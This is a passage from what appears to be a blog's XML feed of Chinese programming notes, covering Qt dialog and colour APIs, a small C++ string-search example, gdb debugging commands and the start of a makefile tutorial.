green)</span></span>;<span class="hljs-comment">// 绿色</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setBlue</span><span class="hljs-params">(<span class="hljs-type">int</span> blue)</span></span>;<span class="hljs-comment">// 蓝色</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setAlpha</span><span class="hljs-params">(<span class="hljs-type">int</span> alpha)</span></span>;<span class="hljs-comment">// 透明度, 默认不透明(255)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::setRgb</span><span class="hljs-params">(<span class="hljs-type">int</span> r, <span class="hljs-type">int</span> g, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> a = <span class="hljs-number">255</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::red</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::green</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::blue</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QColor::alpha</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QColor::getRgb</span><span class="hljs-params">(<span class="hljs-type">int</span> *r, <span class="hljs-type">int</span> *g, <span class="hljs-type">int</span> *b, <span class="hljs-type">int</span> *a = <span class="hljs-literal">nullptr</span>)</span> <span class="hljs-type">const</span></span>;<br><br></code></pre></td></tr></table></figure><h4 id="QInputDialog"><a href="#QInputDialog" class="headerlink" title="QInputDialog"></a>QInputDialog</h4><ol><li><p>static public function</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 得到一个可以输入浮点数的对话框窗口, 返回对话框窗口中输入的浮点数</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - value: 对话框窗口中显示的浮点值, 默认为 0</span><br><span class="hljs-comment">  - min: 对话框窗口支持显示的最小数值</span><br><span class="hljs-comment">  - max: 对话框窗口支持显示的最大数值</span><br><span class="hljs-comment">  - decimals: 浮点数的精度, 默认保留小数点以后1位</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">QInputDialog::getDouble</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;label, <span class="hljs-type">double</span> value = <span class="hljs-number">0</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">double</span> min = <span class="hljs-number">-2147483647</span>, <span class="hljs-type">double</span> max = <span class="hljs-number">2147483647</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> decimals = <span class="hljs-number">1</span>, <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags())</span></span>;<br>   <br><span class="hljs-comment">// 得到一个可以输入整形数的对话框窗口, 返回对话框窗口中输入的整形数</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - value: 对话框窗口中显示的整形值, 默认为 0</span><br><span class="hljs-comment">  - min: 对话框窗口支持显示的最小数值</span><br><span class="hljs-comment">  - max: 对话框窗口支持显示的最大数值</span><br><span class="hljs-comment">  - step: 步长, 通过对话框提供的按钮调节数值每次增长/递减的量</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QInputDialog::getInt</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;label, <span class="hljs-type">int</span> value = <span class="hljs-number">0</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> min = <span class="hljs-number">-2147483647</span>, <span class="hljs-type">int</span> max = <span class="hljs-number">2147483647</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> step = <span class="hljs-number">1</span>, <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags())</span></span>;<br>   <br><span class="hljs-comment">// 得到一个带下来菜单的对话框窗口, 返回选择的菜单项上边的文本信息</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - items: 字符串列表, 用于初始化窗口中的下拉菜单, 每个字符串对应一个菜单项</span><br><span class="hljs-comment">  - current: 通过菜单项的索引指定显示下拉菜单中的哪个菜单项, 默认显示第一个(编号为0)</span><br><span class="hljs-comment">  - editable: 设置菜单项上的文本信息是否可以进行编辑, 默认为true, 即可以编辑</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">  - inputMethodHints: 设置显示模式, 默认没有指定任何特殊显示格式, 显示普通文本字符串</span><br><span class="hljs-comment">    - 如果有特殊需求, 可以参数帮助文档进行相关设置</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function">QString <span class="hljs-title">QInputDialog::getItem</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;label, <span class="hljs-type">const</span> QStringList &amp;items, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">int</span> current = <span class="hljs-number">0</span>, <span class="hljs-type">bool</span> editable = <span class="hljs-literal">true</span>, <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags(), </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::InputMethodHints inputMethodHints = Qt::ImhNone)</span></span>;<br>   <br><span class="hljs-comment">// 得到一个可以输入多行数据的对话框窗口, 返回用户在窗口中输入的文本信息</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口</span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - text: 指定显示到多行输入框中的文本信息, 默认是空字符串</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">  - inputMethodHints: 设置显示模式, 默认没有指定任何特殊显示格式, 显示普通文本字符串</span><br><span class="hljs-comment">    - 如果有特殊需求, 可以参数帮助文档进行相关设置</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function">QString <span class="hljs-title">QInputDialog::getMultiLineText</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, <span class="hljs-type">const</span> QString &amp;label, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;text = QString(), <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags(), </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::InputMethodHints inputMethodHints = Qt::ImhNone)</span></span>;<br>   <br><span class="hljs-comment">// 得到一个可以输入单行信息的对话框窗口, 返回用户在窗口中输入的文本信息</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - parent: 对话框窗口的父窗口 </span><br><span class="hljs-comment">  - title: 对话框窗口显示的标题信息</span><br><span class="hljs-comment">  - label: 对话框窗口中显示的文本信息(用于描述对话框的功能)</span><br><span class="hljs-comment">  - mode: 指定单行编辑框中数据的反馈模式, 是一个 QLineEdit::EchoMode 类型的枚举值</span><br><span class="hljs-comment">    - QLineEdit::Normal: 显示输入的字符。这是默认值</span><br><span class="hljs-comment">    - QLineEdit::NoEcho: 不要展示任何东西。这可能适用于连密码长度都应该保密的密码。</span><br><span class="hljs-comment">    - QLineEdit::Password: 显示与平台相关的密码掩码字符，而不是实际输入的字符。</span><br><span class="hljs-comment">    - QLineEdit::PasswordEchoOnEdit: 在编辑时按输入显示字符，否则按密码显示字符。</span><br><span class="hljs-comment">  - text: 指定显示到单行输入框中的文本信息, 默认是空字符串</span><br><span class="hljs-comment">  - ok: 传出参数, 用于判断是否得到了有效数据, 一般不会使用该参数</span><br><span class="hljs-comment">  - flags: 对话框窗口的窗口属性, 使用默认值即可</span><br><span class="hljs-comment">  - inputMethodHints: 设置显示模式, 默认没有指定任何特殊显示格式, 显示普通文本字符串</span><br><span class="hljs-comment">     - 如果有特殊需求, 可以参数帮助文档进行相关设置</span><br><span class="hljs-comment">*/</span><br>[<span class="hljs-type">static</span>] <span class="hljs-function">QString <span class="hljs-title">QInputDialog::getText</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            QWidget *parent, <span class="hljs-type">const</span> QString &amp;title, <span class="hljs-type">const</span> QString &amp;label,</span></span><br><span class="hljs-params"><span class="hljs-function">            QLineEdit::EchoMode mode = QLineEdit::Normal, </span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> QString &amp;text = QString(), <span class="hljs-type">bool</span> *ok = <span class="hljs-literal">nullptr</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::WindowFlags flags = Qt::WindowFlags(), </span></span><br><span class="hljs-params"><span class="hljs-function">            Qt::InputMethodHints inputMethodHints = Qt::ImhNone)</span></span>;<br>   <br></code></pre></td></tr></table></figure></li></ol><h4 id="QProgressDialog（进度条）"><a href="#QProgressDialog（进度条）" class="headerlink" title="QProgressDialog（进度条）"></a>QProgressDialog（进度条）</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">  - labelText: 对话框中显示的提示信息</span><br><span class="hljs-comment">  - cancelButtonText: 取消按钮上显示的文本信息</span><br><span class="hljs-comment">  - minimum: 进度条最小值</span><br><span class="hljs-comment">  - maximum: 进度条最大值</span><br><span class="hljs-comment">  - parent: 当前窗口的父对象</span><br><span class="hljs-comment">  - f: 当前进度窗口的flag属性, 使用默认属性即可, 无需设置</span><br><span class="hljs-comment">*/</span><br>QProgressDialog::<span class="hljs-built_in">QProgressDialog</span>(<br>    QWidget *parent = <span class="hljs-literal">nullptr</span>, <br>    Qt::WindowFlags f = Qt::<span class="hljs-built_in">WindowFlags</span>());<br><br>QProgressDialog::<span class="hljs-built_in">QProgressDialog</span>(<br>    <span class="hljs-type">const</span> QString &amp;labelText, <span class="hljs-type">const</span> QString &amp;cancelButtonText, <br>    <span class="hljs-type">int</span> minimum, <span class="hljs-type">int</span> maximum, QWidget *parent = <span class="hljs-literal">nullptr</span>,<br>    Qt::WindowFlags f = Qt::<span class="hljs-built_in">WindowFlags</span>());<br><br><br><span class="hljs-comment">// 设置取消按钮显示的文本信息</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setCancelButtonText</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;cancelButtonText)</span></span>;<br><br><span class="hljs-comment">// 公共成员函数和槽函数</span><br><span class="hljs-function">QString <span class="hljs-title">QProgressDialog::labelText</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setLabelText</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text)</span></span>;<br><br><span class="hljs-comment">// 得到进度条最小值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QProgressDialog::minimum</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 设置进度条最小值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setMinimum</span><span class="hljs-params">(<span class="hljs-type">int</span> minimum)</span></span>;<br><br><span class="hljs-comment">// 得到进度条最大值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QProgressDialog::maximum</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 设置进度条最大值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setMaximum</span><span class="hljs-params">(<span class="hljs-type">int</span> maximum)</span></span>;<br><br><span class="hljs-comment">// 设置进度条范围(最大和最小值)</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setRange</span><span class="hljs-params">(<span class="hljs-type">int</span> minimum, <span class="hljs-type">int</span> maximum)</span></span>;<br><br><span class="hljs-comment">// 得到进度条当前的值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QProgressDialog::value</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 设置进度条当前的值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setValue</span><span class="hljs-params">(<span class="hljs-type">int</span> progress)</span></span>;<br><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QProgressDialog::autoReset</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 当value() = maximum()时，进程对话框是否调用reset()，此属性默认为true。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setAutoReset</span><span class="hljs-params">(<span class="hljs-type">bool</span> reset)</span></span>;<br><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">QProgressDialog::autoClose</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><span class="hljs-comment">// 当value() = maximum()时，进程对话框是否调用reset()并且隐藏，此属性默认为true。</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::setAutoClose</span><span class="hljs-params">(<span class="hljs-type">bool</span> close)</span></span>;<br><br><span class="hljs-comment">// 判断用户是否按下了取消键, 按下了返回true, 否则返回false</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">wasCanceled</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br><br><span class="hljs-comment">// 重置进度条</span><br><span class="hljs-comment">// 重置进度对话框。wascancelled()变为true，直到进程对话框被重置。进度对话框被隐藏。</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::cancel</span><span class="hljs-params">()</span></span>;<br><span class="hljs-comment">// 重置进度对话框。如果autoClose()为真，进程对话框将隐藏。</span><br>[slot] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::reset</span><span class="hljs-params">()</span></span>;   <br><br><span class="hljs-comment">// 信号</span><br><span class="hljs-comment">// 当单击cancel按钮时，将发出此信号。默认情况下，它连接到cancel()槽。</span><br>[signal] <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QProgressDialog::canceled</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-comment">// 设置窗口的显示状态(模态, 非模态)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数:</span><br><span class="hljs-comment">    Qt::NonModal  -&gt; 非模态</span><br><span class="hljs-comment">    Qt::WindowModal-&gt; 模态, 阻塞父窗口</span><br><span class="hljs-comment">    Qt::ApplicationModal -&gt; 模态, 阻塞应用程序中的所有窗口</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QWidget::setWindowModality</span><span class="hljs-params">(Qt::WindowModality windowModality)</span></span>;<br><br></code></pre></td></tr></table></figure><h3 id="QMainWindow"><a href="#QMainWindow" class="headerlink" title="QMainWindow"></a>QMainWindow</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230730161837845.png" alt="image-20230730161837845"></p><p><img src="https://subingwen.cn/qt/qt-base-window/image-b255c1da57dc41f780f16f3e82f75f7c.png" alt="QMainWindow类型窗口结构"></p><ol><li><p>菜单栏</p><ul><li><p>在ui中添加菜单栏</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230730162004616.png" alt="image-20230730162004616"></p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c++新特性</title>
    <link href="/2023/06/26/c++/cpp%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    <url>/2023/06/26/c++/cpp%E6%96%B0%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<ol><li><p>在<code>string</code>里面使用<code>find</code>函数查找子串</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::string a=<span class="hljs-string">&quot;this&quot;</span>;<br>    std::string b=<span class="hljs-string">&quot;this is b&quot;</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> tem= a&lt;=&gt;b;<br>    <span class="hljs-keyword">auto</span> i=b.<span class="hljs-built_in">find</span>(a);<br>    <span class="hljs-keyword">if</span>(i!=std::string::npos)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt; i+a.<span class="hljs-built_in">size</span>(); ++j) &#123;<br>            std::cout&lt;&lt;b[j];<br>        &#125;<br>        std::cout&lt;&lt;std::endl&lt;&lt;<span class="hljs-string">&quot;^&quot;</span>&lt;&lt;i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dgb调试</title>
    <link href="/2023/06/24/linux/dgb%E8%B0%83%E8%AF%95/"/>
    <url>/2023/06/24/linux/dgb%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h1><h2 id="gdb的使用"><a href="#gdb的使用" class="headerlink" title="gdb的使用"></a>gdb的使用</h2><blockquote><p> -g 将调试信息写入到可执行程序中</p><p> gcc -g args.c -o app</p></blockquote><h3 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h3><ol><li><p>启动</p><p><code>gdb 调试文件</code></p></li><li><p>进入代码模式</p><p>在以下界面输入<code>l</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230624203806212.png"></p></li><li><p>退出</p><p><code>quit</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230624203907802.png"></p></li><li><p>设置命令行参数</p><p><code>set args</code></p></li><li><p>查看设置的参数</p><p>show args</p></li><li><p>启动程序</p><ul><li><p>start  只会执行一行</p><p>c    会继续执行命令</p></li><li><p>run   会把程序执行完</p></li></ul></li><li><p>查看本文件的代码</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230625222900269.png"></p></li><li><p>查看其他文件的代码</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230626091119591.png" alt="image-20230626091119591"></p></li><li><p>直接回车是执行上一次的命令</p></li><li><p>设置显示的行数</p></li></ol><p>   <code>set listsize 20</code>显示20行</p><ol start="11"><li><p>设置断点</p><ul><li><p>对某一行设置断点</p><p><code>b 行号</code></p></li><li><p>条件断点</p><p><code>b if 变量=值</code></p></li></ul></li><li><p>控制断点的状态</p><ul><li><p>删除断点</p><p><code>del</code></p></li><li><p>使断点失效</p><p><code>dis</code></p></li><li><p>恢复断点</p><p><code>ena</code></p></li></ul></li><li><p>打印值</p><ul><li><p><code>p  变量名</code></p><p>这种方法只会进行一次，使用一次打印一次</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gdb/image-20230626095112562.png" alt="image-20230626095112562"></p></li><li><p>自动跟踪某个变量</p><ul><li><p><code>display 变量名</code></p></li><li><p><code>info display</code></p><p>看跟踪了哪些变量</p></li><li><p>取消跟踪</p><p><code>undisplay 编号</code></p></li><li><p>禁用</p><p><code>disable display 编号</code></p></li><li><p>启用</p><p><code>enable display 编号</code></p></li></ul></li></ul></li><li><p>打印类型</p><p>ptype 变量名</p></li><li><p>调试</p><ul><li><p>单步调试</p><ul><li><p><code>step</code>  命令一行一行的向下运行</p></li><li><p><code>finish</code></p><p>跳出函数</p></li><li><p><code>until</code></p><p>跳出循环体</p></li></ul></li></ul></li><li><p>设置变量值</p><p><code>set var 变量名=值</code></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的聊天室</title>
    <link href="/2023/06/23/go/%E7%AE%80%E5%8D%95%E7%9A%84%E8%81%8A%E5%A4%A9%E5%AE%A4/"/>
    <url>/2023/06/23/go/%E7%AE%80%E5%8D%95%E7%9A%84%E8%81%8A%E5%A4%A9%E5%AE%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="简单的聊天室"><a href="#简单的聊天室" class="headerlink" title="简单的聊天室"></a>简单的聊天室</h1>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>makefile</title>
    <link href="/2023/06/20/linux/makefile/"/>
    <url>/2023/06/20/linux/makefile/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><h2 id="make是什么"><a href="#make是什么" class="headerlink" title="make是什么"></a>make是什么</h2><p> make 是一个命令工具，是一个解释 makefile 中指令的命令工具</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs make"><span class="hljs-comment"># 举例: 有源文件 a.c b.c c.c head.h, 需要生成可执行程序 app</span><br><span class="hljs-comment">################# 例1 #################</span><br><span class="hljs-section">app:a.c b.c c.c</span><br>    gcc a.c b.c c.c -o app<br><br><span class="hljs-comment">################# 例2 #################</span><br><span class="hljs-comment"># 有多个目标, 多个依赖, 多个命令</span><br><span class="hljs-section">app,app1:a.c b.c c.c d.c</span><br>    gcc a.c b.c -o app<br>    gcc c.c d.c -o app1<br><br><span class="hljs-comment">################# 例3 #################</span><br><span 